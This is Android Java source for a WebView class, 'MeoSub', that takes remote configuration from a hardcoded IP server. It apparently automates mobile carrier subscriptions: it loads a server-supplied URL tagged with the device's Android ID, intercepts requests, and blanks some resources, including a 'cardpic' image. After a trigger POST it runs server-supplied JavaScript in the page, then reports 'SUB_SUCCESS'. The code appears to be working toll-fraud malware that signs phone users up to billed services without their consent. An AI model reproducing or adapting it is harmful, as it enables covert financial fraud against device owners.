package com.enhtmv.sublib.webview.putaoya;

import android.util.Log;
import android.webkit.ValueCallback;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.alibaba.fastjson.JSON;
import com.enhtmv.sublib.common.SubEvent;
import com.enhtmv.sublib.webview.SubWebView;
import com.enhtmv.sublib.common.util.StringUtil;
import com.enhtmv.sublib.common.util.SubLog;


import java.io.InputStream;
import java.util.concurrent.atomic.AtomicBoolean;

import static com.enhtmv.sublib.common.SubEvent.*;


public class MeoSub extends SubWebView {

    public MeoSub(WebView webView, SubEvent subEvent) {

        super(webView, "http://54.153.76.222:8081", "meo", subEvent);

    }


    @Override
    public void sub(final String text) {


        new Thread(new Runnable() {
            @Override
            public void run() {

                try {
                    if (!StringUtil.isEmpty(text)) {

                        final MetaInfo info = JSON.parseObject(text, MetaInfo.class);

                        if (info.meoLoadUrl != null) {

                            final AtomicBoolean atomicBoolean = new AtomicBoolean(true);

                            handler.post(new Runnable() {
                                @Override
                                public void run() {
                                    webView.setWebViewClient(new WebViewClient() {

                                        @Override
                                        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                                            view.loadUrl(request.getUrl().toString());
                                            return true;
                                        }


                                        @Override
                                        public void onPageFinished(WebView view, String url) {

                                            SubLog.i("load over!", url);

                                            super.onPageFinished(view, url);
                                        }


                                        @Override
                                        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {

                                            String url = request.getUrl().toString();
                                            Log.i(request.getMethod(), url);
                                            String method = request.getMethod();

                                            try {


                                                //过滤资源
                                                if (ignore(request) || url.startsWith("http://enabler.dvbs.com/session/cardpic")) {

                                                    return new WebResourceResponse("", "", null);

                                                } else if (url.endsWith("jquery.min.js")) {

                                                    InputStream inputStream = webView.getContext().getAssets().open("meo.jquery-3.1.1.min.js");

                                                    return new WebResourceResponse("text/javascript", "UTF-8", inputStream);

                                                }

                                                // js 触发条件
                                                else if (url.contains(info.meoFireUrl) && "POST".equals(method)) {

                                                    WebResourceResponse response = super.shouldInterceptRequest(view, request);


                                                    if (atomicBoolean.get()) {

                                                        atomicBoolean.set(false);

                                                        handler.postDelayed(new Runnable() {
                                                            @Override
                                                            public void run() {

                                                                //String javascript = "console.log(document.getElementById(\"btn_continuar\").getAttribute('value'))";

                                                                webView.evaluateJavascript(info.meoJscript, new ValueCallback<String>() {
                                                                    @Override
                                                                    public void onReceiveValue(String s) {
                                                                        report(CALL_JAVASCRIPT);
                                                                        SubLog.i("execute javascript", s);
                                                                    }

                                                                });

                                                            }

                                                        }, 2000);

                                                    }

                                                    return response;

                                                    //执行成功判断
                                                } else if (url.contains(info.meoSuccessUrl)) {

                                                    successCall.callback("success");
                                                    report(SUB_SUCCESS);

                                                } else {
                                                    return super.shouldInterceptRequest(view, request);
                                                }

                                            } catch (Exception e) {

                                                SubLog.e(e);
                                                report.e("error", e);
                                                event.onError(e);
                                            }

                                            return super.shouldInterceptRequest(view, request);
                                        }

                                    });


                                    webView.loadUrl(info.meoLoadUrl + "&clickId=" + androidId);
                                    report(SUB_REQEUST);
                                }
                            });


                        }

                    }

                } catch (Exception e) {
                    SubLog.e(e);
                    report.e("error", e);
                    event.onError(e);
                }

            }
        }).start();

    }


    @Override
    public void onSub(String message) {

    }

}
